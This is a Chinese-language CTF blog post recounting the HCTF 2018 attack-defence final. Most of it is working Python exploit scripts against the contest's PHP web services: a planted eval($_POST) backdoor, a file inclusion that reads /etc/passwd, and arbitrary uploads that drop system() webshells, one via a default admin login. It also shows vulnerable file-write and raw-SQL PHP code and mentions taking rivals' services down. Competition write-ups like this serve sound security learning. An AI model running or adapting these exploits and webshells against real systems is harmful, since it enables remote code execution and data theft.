---
layout: post
category: CTF
title: HCTF 2018 Final 
subtitle: HCTF 2018 决赛 web题记录
catalog: true
excerpt:  以Redbud名义参加了一下HCTF2018 决赛，分享下线下赛经验
time: 2018.12.31 22:35:00
tags:
- CTF
- Web

---

# HCTF 2018决赛

以Redbud参加了这次的HCTF 决赛。总的来说，虽有遗憾，但总体也还不错。

这次线下赛去的萌新比较多，所以整体比赛环境还不算太激烈。

HCTF 线下最吸引我的，就是运维可交流。现在国内赛事都被XX、XXXX所垄断，商业气息太严重，线下赛运维人员往往不作为，导致每次比赛都要和运维斗智斗勇，比较累。

这次HCTF至少能和运维出题人交流，还是很棒的。也能看出出题团队确实也很努力，都很辛苦。

整个赛局，上半场打得还是很爽，虽然一开始web1的ssh密码给错了，导致10分钟才上线gamebox，但由于提前自己写了一个自动审计的小工具，很快就写出了第一个exp。不过，比赛环境不知道怎么回事，没办法通过system写马，调了很久。后面看到场上有人打一血了，就不得不先打了一波getflag。后面，才断断续续弄了个php型不死马苟着。

整个赛场还是延续去年的各种down服务状况。但由于今年改了赛制，被down的队伍无法被攻击，导致我们这边无法通过攻击拿分比较难受。而且，HCTF Web check一如既往的严苛，甚至有些不大符合正常开发的逻辑，在一些非预期的地方进行check，甚至其部分check功能中还夹带着攻击流量。不过，也能理解，或许出题人还是想对通防做限制吧，也算是一份努力。

整个赛局很诡异，第一天中午的时候打了一波down服务，成功把大部分打挂了，打得比较爽。后面，主办方突然通知前10轮，我们的服务都是挂的，被扣了2k分。。。然后，直接被打乱了备份策略，只能从最原始的环境备份。估计这个时候，场上有各类打down脚本，导致修了半天都没修好，就下午4点多的时候勉强苟了几轮。

不得不说，北邮这次运维还是做的很棒的，他们下午修好以后，就没咋挂掉，每次都能拿到一波全场分。后面交流，他们好像找到了check流量，这是我们没做好的一点。

Web2 实现了一波守护型webshell，整体效果还是很符合预期，在守护的状态下，对方选手基本都无法删除我的马，还是很爽。

最后，拿了个全场第二，没拿第一还是比较可惜，希望下次能做到更好吧，补足与吸收这次比赛中的运维技巧。

## Web1

#### 预留后门

路径config/emmm_version.php

```php
<?php

$emmm_version="v1006";
$emmm_versiondate="233333";
$emmm_00O0o0OO0="95d4f8af44";
$emmm_weixin="close";
$emmm_apps="close";
$emmm_alifuwu="close";
@eval($_POST[ahahahhahaah]);
?>
```

简单内置一句话后门，直接利用

```python
# coding:utf-8
from urllib import quote
from framework.function import *
from framework.flag import  *
import traceback
import requests


proxies = {
#{"http": "http://127.0.0.1:8080"},
}


def vulnerable_attack(target, target_port, cmd):
    """
    针对php 后门
    eval($_POST[333]);
    assert($_POST[333]);
    """
    try:
        session = requests.Session()
        # echo shell_exec('ls');
        # paramsGet = {"moxiaoxi": "system('{cmd}');".format(cmd=cmd)}
        # response = session.get("http://{}:{}/webshell.php".format(target, target_port), params=paramsGet, headers=headers,timeout=timeout,proxies=proxies)
        paramsPOST = {"ahahahhahaah": "system('{cmd}');".format(cmd=cmd)}
        # print(paramsPOST)
        response = session.post("http://{}:{}/config/emmm_version.php".format(target, target_port), data=paramsPOST,
                                headers=headers, timeout=timeout, proxies=proxies)
        # print("Status code:   %i" % response.status_code)
        # print("Response body: %s" % response.content)
        res = response.content
        # before = "mo123h"
        # after = "<pre class='xdebug-var-dump' dir='ltr'>"
        # s = res[res.find(before)+len(before):res.find(after)]
        res = res.strip()
    except Exception, e:
        debug_print(traceback.format_exc())
        dump_error("attack failed", target, "vulnerable attack")
        res = "error"
    return res

```

#### img文件包含

存在文件包含利用点

```php
if ($_GET['img']) {
    include($_GET['img']);
}
```

但这个框架下，必须登录才能利用。

这个点很坑，check貌似会检查这个点，不能直接删除，需要对应过滤！！！

exp如下：

```python
# coding:utf-8
from urllib import quote
from framework.function import *
import traceback
import requests
import re
import random, string


proxies = {
     "http": "http://127.0.0.1:8080"
}


session = requests.Session()
salt = ''.join(random.sample(string.ascii_letters + string.digits, 5))

def read_code(user, target='192.168.100.100', port='5003'):
    paramsGet = {"0.23920582878486196": ""}
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
        "Referer": "http://{}:{}/client/user/?cn-reg.html".format(target, port), "Connection": "close",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Accept": "image/webp,image/apng,image/*,*/*;q=0.8"}
    response = session.get("http://{}:{}/function/emmm_code.php".format(target, port), params=paramsGet,
                           headers=headers, proxies=proxies)

    # print("Status code:   %i" % response.status_code)
    assert response.status_code == 200


def reg(user, target='192.168.100.100', port='5003'):
    paramsGet = {"emmm_cms": "reg"}
    paramsPost = {"COL_Useremail": user + "@qq.com", "COL_Userpass": user, "code": "8888", "introducer": "",
                  "COL_Userproblem": "\x4f60\x81ea\x5df2\x7684\x751f\x65e5\xff1f", "COL_Useranswer": user,
                  "ip": "192.168.13.135", "Submit": "\x63d0\x4ea4\x6ce8\x518c", "source": "0", "lang": "cn",
                  "COL_Userpass2": user}
    headers = {"Origin": "http://{}:{}".format(target, port), "Cache-Control": "max-age=0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
               "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
               "Referer": "http://{}:{}/client/user/?cn-reg.html".format(target, port), "Connection": "close",
               "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("http://{}:{}/client/user/emmm_play.class.php".format(target, port), data=paramsPost,
                            params=paramsGet, headers=headers)
    assert response.status_code == 200
    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if '/client/user/' in response.content:
        print('Reg user:{} succ'.format(user))
        return



def login_user(user, target='192.168.100.100', port='5003'):
    paramsGet = {"emmm_cms": "login"}
    paramsPost = {"COL_Useremail": user + "@qq.com", "Submit": "\x7acb\x5373\x767b\x5f55", "COL_Userpass": user,
                  "code": "8888", "lang": "cn"}
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0",
               "Referer": "http://{}:{}/client/user/?cn-login.html".format(target, port), "Connection": "close",
               "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "DNT": "1",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("http://{}:{}/client/user/emmm_play.class.php".format(target, port), data=paramsPost,
                            params=paramsGet, headers=headers)
    assert response.status_code == 200
    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if '/client/user/' in response.content:
        print('Loggin user:{} succ'.format(user))
        return


def vulnerable_attack(target, target_port, cmd):
    """
    针对php 后门
    eval($_POST[333]);
    assert($_POST[333]);
    """
    try:
        user = 'moxiaoxi' + salt
        read_code(user, target, target_port)
        reg(user,target, target_port)
        login_user(user, target, target_port)
        paramsGet = {"img": "/etc/passwd"}
        response = session.get("http://{}:{}/client/user/index.php".format(target, target_port), params=paramsGet, headers=headers,proxies=proxies)
        res = response.content.strip()
    except Exception, e:
        debug_print(traceback.format_exc())
        dump_error("attack failed", target, "vulnerable attack")
        res = "error"
    return res


```



#### filebox 任意文件上传

Emmm_filebox.php 文件可以任意文件上传，直接上传webshell

```python
# coding:utf-8
from urllib import quote
from framework.function import *
import traceback
import requests
import random, string


proxies = {
    # "http": "http://127.0.0.1:8080"
}


session = requests.Session()

def read_code(user, target='192.168.100.100', port='5003'):
    paramsGet = {"0.23920582878486196": ""}
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
        "Referer": "http://{}:{}/client/user/?cn-reg.html".format(target, port), "Connection": "close",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Accept": "image/webp,image/apng,image/*,*/*;q=0.8"}
    response = session.get("http://{}:{}/function/emmm_code.php".format(target, port), params=paramsGet,
                           headers=headers)

    # print("Status code:   %i" % response.status_code)
    assert response.status_code == 200


def reg(user, target='192.168.100.100', port='5003'):
    paramsGet = {"emmm_cms": "reg"}
    paramsPost = {"COL_Useremail": user + "@qq.com", "COL_Userpass": user, "code": "8888", "introducer": "",
                  "COL_Userproblem": "\x4f60\x81ea\x5df2\x7684\x751f\x65e5\xff1f", "COL_Useranswer": user,
                  "ip": "192.168.13.135", "Submit": "\x63d0\x4ea4\x6ce8\x518c", "source": "0", "lang": "cn",
                  "COL_Userpass2": user}
    headers = {"Origin": "http://{}:{}".format(target, port), "Cache-Control": "max-age=0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
               "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
               "Referer": "http://{}:{}/client/user/?cn-reg.html".format(target, port), "Connection": "close",
               "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("http://{}:{}/client/user/emmm_play.class.php".format(target, port), data=paramsPost,
                            params=paramsGet, headers=headers)
    assert response.status_code == 200
    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if '/client/user/' in response.content:
        print('Reg user:{} succ'.format(user))
        return



def login_user(user, target='192.168.100.100', port='5003'):
    paramsGet = {"emmm_cms": "login"}
    paramsPost = {"COL_Useremail": user + "@qq.com", "Submit": "\x7acb\x5373\x767b\x5f55", "COL_Userpass": user,
                  "code": "8888", "lang": "cn"}
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0",
               "Referer": "http://{}:{}/client/user/?cn-login.html".format(target, port), "Connection": "close",
               "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "DNT": "1",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("http://{}:{}/client/user/emmm_play.class.php".format(target, port), data=paramsPost,
                            params=paramsGet, headers=headers)
    assert response.status_code == 200
    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if '/client/user/' in response.content:
        print('Loggin user:{} succ'.format(user))
        return

def admin_login(target='192.168.100.100', port='5003'):

    paramsGet = {"emmm_admin":"login"}
    paramsPost = {"loginpass":"admin","Submit":"\x767b \x5f55","loginname":"admin","emmm_kouling":"12345"}
    headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36","Connection":"close","DNT":"1","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7","Content-Type":"application/x-www-form-urlencoded"}
    response = session.post("http://{target}:{port}/admin.php".format(target=target, port=port), data=paramsPost, params=paramsGet, headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    assert response.status_code == 200
    if '/admin.php?emmm=admin' in response.text:
        print('Logging Adming Succ')
        return True


def vulnerable_attack(target, target_port, cmd):
    import re
    """
    针对php 后门
    eval($_POST[333]);
    assert($_POST[333]);
    """
    salt = ''.join(random.sample(string.ascii_letters + string.digits, 5))
    try:
        user = 'moxiaoxi' + salt
        read_code(user, target, target_port)
        # reg(user)
        # login_user(user)
        admin_login(target, target_port)
        bd_path = '.moxiaoxi-{salt}.php'.format(salt=salt) # 随机的，不能覆盖写，每次新写都要不一样
        url = 'http://{target}:{target_port}/client/manage/emmm_filebox.php'.format(target=target, target_port=target_port)
        params = {
            "encode":"UTF-8","op":"save","code":"GFmNGU6xpvxTHdE9GVNMLjdGPv7ed9Xy6xpvxT","validation":"12345",
            "ncontent":"<?php system('{cmd}');?>".format(cmd=cmd), # shell
            "fename":"/home/team/workdir/skin/{bd_path}/.".format(bd_path=bd_path)
        }
        _cookie = {"PHPSESSID":"ugqv1gnb08pscrjr00s8hoqpkf"}
        _headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36","Connection":"close","DNT":"1","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7"}

        res = session.get(url, params=params, cookies=_cookie, headers=_headers, proxies=proxies)
        # print res.text
        if not bd_path in res.text:
            dump_error("attack failed", target, "vulnerable attack")
            return False
        url2 = 'http://{target}:{target_port}/skin/{bd_path}'.format(target=target, target_port=target_port, bd_path=bd_path)
        res2 = session.get(url2, cookies=_cookie, headers=_headers, proxies=proxies)
        res = res2.content.strip()
    except Exception, e:
        debug_print(traceback.format_exc())
        dump_error("attack failed", target, "vulnerable attack")
        res = "error"
    return res

```



#### Emmm_play.class.php 文件上传

```python
# coding:utf-8
from urllib import quote
from framework.function import *
import traceback
import requests
import re
import random, string


proxies = {
    # "http": "http://127.0.0.1:7890"
}


session = requests.Session()
salt = ''.join(random.sample(string.ascii_letters + string.digits, 5))

def read_code(user, target='192.168.100.100', port='5003'):
    paramsGet = {"0.23920582878486196": ""}
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
        "Referer": "http://{}:{}/client/user/?cn-reg.html".format(target, port), "Connection": "close",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Accept": "image/webp,image/apng,image/*,*/*;q=0.8"}
    response = session.get("http://{}:{}/function/emmm_code.php".format(target, port), params=paramsGet,
                           headers=headers, proxies=proxies)

    # print("Status code:   %i" % response.status_code)
    assert response.status_code == 200


def reg(user, target='192.168.100.100', port='5003'):
    paramsGet = {"emmm_cms": "reg"}
    paramsPost = {"COL_Useremail": user + "@qq.com", "COL_Userpass": user, "code": "8888", "introducer": "",
                  "COL_Userproblem": "\x4f60\x81ea\x5df2\x7684\x751f\x65e5\xff1f", "COL_Useranswer": user,
                  "ip": "192.168.13.135", "Submit": "\x63d0\x4ea4\x6ce8\x518c", "source": "0", "lang": "cn",
                  "COL_Userpass2": user}
    headers = {"Origin": "http://{}:{}".format(target, port), "Cache-Control": "max-age=0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
               "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
               "Referer": "http://{}:{}/client/user/?cn-reg.html".format(target, port), "Connection": "close",
               "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("http://{}:{}/client/user/emmm_play.class.php".format(target, port), data=paramsPost,
                            params=paramsGet, headers=headers)
    assert response.status_code == 200
    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if '/client/user/' in response.content:
        print('Reg user:{} succ'.format(user))
        return



def login_user(user, target='192.168.100.100', port='5003'):
    paramsGet = {"emmm_cms": "login"}
    paramsPost = {"COL_Useremail": user + "@qq.com", "Submit": "\x7acb\x5373\x767b\x5f55", "COL_Userpass": user,
                  "code": "8888", "lang": "cn"}
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0",
               "Referer": "http://{}:{}/client/user/?cn-login.html".format(target, port), "Connection": "close",
               "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "DNT": "1",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("http://{}:{}/client/user/emmm_play.class.php".format(target, port), data=paramsPost,
                            params=paramsGet, headers=headers)
    assert response.status_code == 200
    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if '/client/user/' in response.content:
        print('Loggin user:{} succ'.format(user))
        return

def login_user_a(target='192.168.100.100', port='5003'):

    paramsGet = {"emmm_cms":"login"}
    paramsPost = {"COL_Useremail":"a@a.com","Submit":"\x7acb\x5373\x767b\x5f55","COL_Userpass":"123456","code":"8888","lang":"cn"}
    headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36","Connection":"close","DNT":"1","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7","Content-Type":"application/x-www-form-urlencoded"}
    response = session.post("http://{target}:{target_port}/client/user/emmm_play.class.php".format(target=target, target_port=port), data=paramsPost, params=paramsGet, headers=headers, proxies=proxies)

    assert response.status_code == 200
    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if '/client/user/' in response.content:
        print('Loggin user:{} succ'.format('a@a.com'))
        return



def admin_login(target='192.168.100.100', port='5003'):

    paramsGet = {"emmm_admin":"login"}
    paramsPost = {"loginpass":"admin","Submit":"\x767b \x5f55","loginname":"admin","emmm_kouling":"12345"}
    headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36","Connection":"close","DNT":"1","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7","Content-Type":"application/x-www-form-urlencoded"}
    response = session.post("http://{target}:{port}/admin.php".format(target=target, port=port), data=paramsPost, params=paramsGet, headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    assert response.status_code == 200
    if '/admin.php?emmm=admin' in response.text:
        print('Logging Adming Succ')
        return True

def get_data(target, target_port):
    headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36","Connection":"close","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"}
    response = session.get("http://{target}:{target_port}/client/user/?cn-useredit.html".format(target=target, target_port=target_port), headers=headers, proxies=proxies, allow_redirects=False)

    # assert response.status_code == 200
    usercode = re.findall(r'type="hidden" name="usercode" value="([0-9a-zA-Z]*)"', response.text)
    password = re.findall(r'type="hidden" name="password" value="([0-9a-f]{16})"', response.text)
    if usercode and password:
        return (usercode[0], password[0])
    return ('', '')
    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)



def vulnerable_attack(target, target_port, cmd):
    """
    针对php 后门
    eval($_POST[333]);
    assert($_POST[333]);
    """
    try:
        user = 'moxiaoxi' + salt
        read_code(user, target, target_port)
        # reg(user)
        # login_user(user)
        # admin_login(target, target_port)
        login_user_a(target, target_port)
        usercode, password = get_data(target, target_port)
        url = 'http://{target}:{target_port}/client/user/emmm_play.class.php'.format(target=target, target_port=target_port)
        params = {
            "emmm_cms":"edit",
            "lang":"cn"
        }
        data = {
            "code":"8888",
            "COL_Userproblem":"\xe4\xbd\xa0\xe8\x87\xaa\xe5\xb7\xb2\xe7\x9a\x84\xe7\x94\x9f\xe6\x97\xa5\xef\xbc\x9f",
            "COL_Usertel":"1234567890",
            "COL_Userskype":"",
            "COL_Userpass2":"",
            "COL_Useradd":"",
            "COL_Userpass":"",
            "password": password,
            "COL_Useranswer":"123123",
            "Submit":"\xe6\x8f\x90\xe4\xba\xa4",
            "COL_Userqq":"",
            "usercode": usercode,
            "lang":"cn",
            "COL_Username": user + "@qq.com",
            "COL_Usertext":"",
            "COL_Useraliww":""
        }
        headers = {"Accept":"image/webp,image/apng,image/*,*/*;q=0.8","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36","Referer":"http://192.168.100.100:5009/client/user/","Connection":"close","DNT":"1","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7"}
        payload_name = '.moxiaoxi-{salt}.php'.format(salt=salt)
        payload_context = '<?php system("{cmd}");?>'.format(cmd=cmd)
        files = [('file', (payload_name, payload_context, 'application/octet-stream'))]
        response = session.post(url, data=data, files=files, params=params, headers=headers, proxies=proxies)
        if not '/client/user/?cn-useredit.html' in response.text:
            dump_error("attack failed", target, "vulnerable attack")
            return

        url2 = 'http://{target}:{target_port}/skin/{payload_name}'.format(target=target, target_port=target_port, payload_name=payload_name)
        response = requests.get(url2, headers=headers, proxies=proxies)
        res = response.content.strip()
    except Exception, e:
        debug_print(traceback.format_exc())
        dump_error("attack failed", target, "vulnerable attack")
        res = "error"

    return res


```



#### 备份写shell

manage/emmm_bakgo.php中writefile中filename可以文件写入webshell

```php
        function writefile($data, $method = 'w')
        {
            global $fsqlzip, $_POST;;
            $file = "{$_POST[filename]}_pg{$_POST[page]}.php";
            $fp = fopen("$_POST[dir]/$file", "$method");
            flock($fp, 2);
            fwrite($fp, $data);
        }
```

而且该函数参数可控，可利用。



#### 任意sql注入

emmm_sql,php处存在sql注入

```php
	$query = '';
	$sql = stripslashes($_POST['sql']);
	$sql = explode(';',$sql);
	foreach($sql as $op){
		$query = $db -> create($op,2);	
	}
```

create函数没有任何过滤

```php
//创建表 and 执行SQL
	public function create($o = '',$u = 1){
		if($u == 1){
			$Query = mysql_query("create table ".$o);
		}elseif($u == 2){
			$Query = mysql_query($o,$this -> conn);
		}
		return $Query;
	}
```

这里直接输入sql语句，让其执行即可。

场上没怎么打，忙着修服务去了。。。





## Web2

web2可以配.htaccess权限，比较好防御。

#### 内置后门

```python
# coding:utf-8
from urllib import quote
from framework.function import *
from framework.flag import  *
import traceback
import requests


proxies = {
    # "http": "http://127.0.0.1:8080"
}


def vulnerable_attack(target, target_port, cmd):
    """
    针对php 后门
    eval($_POST[333]);
    assert($_POST[333]);
    """
    try:
        session = requests.Session()
        paramsGet = {"along": "system('{}');".format(cmd)}
        headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                   "Cache-Control": "max-age=0", "Connection": "close",
                   "User-Agent": "Mozilla/5.0 (iPad; CPU OS 10_0 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/49.0.2623.109 Mobile/14A5335b Safari/601.1.46",
                   "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Content-Type": "application/x-www-form-urlencoded"}
        response = session.get("http://{}:{}//libraries/lithium/template/view/Compiler.php".format(target, target_port),
                               params=paramsGet, headers=headers)
        res = response.content.strip()
    except Exception, e:
        debug_print(traceback.format_exc())
        dump_error("attack failed", target, "vulnerable attack")
        res = "error"
    return res

```





#### 文件上传

这里有个时间戳转换，需要注意一下

```python
# coding:utf-8
from urllib import quote
from framework.function import *
import traceback
import requests
import random, string
import datetime
import time
import hashlib
import re


proxies = {}#{"http": "http://127.0.0.1:8080"}

session = requests.Session()

def reg(user, target, target_port):
    paramsPost = {"password": user, "username": user, "confirm_password": user}
    headers = {"Origin": "http://{}:{}".format(target,target_port), "Cache-Control": "max-age=0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
               "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
               "Referer": "http://{}:{}/users/register".format(target,target_port), "Connection": "close",
               "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("http://{}:{}/users/register".format(target,target_port), data=paramsPost, headers=headers)
    assert response.status_code==200
    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)

def login(user, target, target_port):
    paramsPost = {"password": user, "username": user}
    headers = {"Origin": "http://{}:{}".format(target,target_port), "Cache-Control": "max-age=0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
               "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
               "Referer": "http://{}:{}/users/login".format(target,target_port), "Connection": "close",
               "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("http://{}:{}/users/login".format(target,target_port), data=paramsPost, headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if '我的漏洞' in response.content:
        print('login succ!')
        return True
    return False

def vulnerable_attack(target, target_port, cmd):
    """
    针对php 后门
    eval($_POST[333]);
    assert($_POST[333]);
    """
    try:
        salt = ''.join(random.sample(string.ascii_letters + string.digits, 5))
        user= 'moxiaoxi' + salt
        reg(user, target, target_port)
        login(user, target, target_port)

        paramsMultipart = [('file', ('wdwd.php', "<?php system('{cmd}');?>".format(cmd=cmd), 'application/octet-stream'))]
        headers = {"Accept":"*/*","X-Requested-With":"XMLHttpRequest","Cache-Control":"no-cache","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36","Connection":"close","Pragma":"no-cache","DNT":"1","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7"}
        response = session.post("http://{}:{}/users/editAvatar".format(target,target_port), files=paramsMultipart, headers=headers, proxies=proxies)
        # print response.text
        # print
        # datetime.datetime.strptime('Sun, 16 Dec 2018 02:42:39 GMT', '%a, %d %b %Y %X %Z') + datetime.timedelta(hours=8)
        tt = datetime.datetime.strptime(response.headers['Date'], '%a, %d %b %Y %X %Z') + datetime.timedelta(hours=8)
        ts = int(time.mktime(tt.timetuple()))
        filename = hashlib.md5(str(ts)).hexdigest() + '.php'
        url = 'http://{target}:{target_port}/uploads/{filename}'.format(target=target, target_port=target_port, filename=filename)
        headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36","Connection":"close","DNT":"1","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7"}
        response = session.get(url, headers=headers, proxies=proxies)
        res = response.content.strip()
        dump_info(url)
        if response.status_code==200:
            dump_info(res)
    except Exception, e:
        debug_print(traceback.format_exc())
        dump_error("attack failed", target, "vulnerable attack")
        res = "error"
    return res


```



其余没咋看了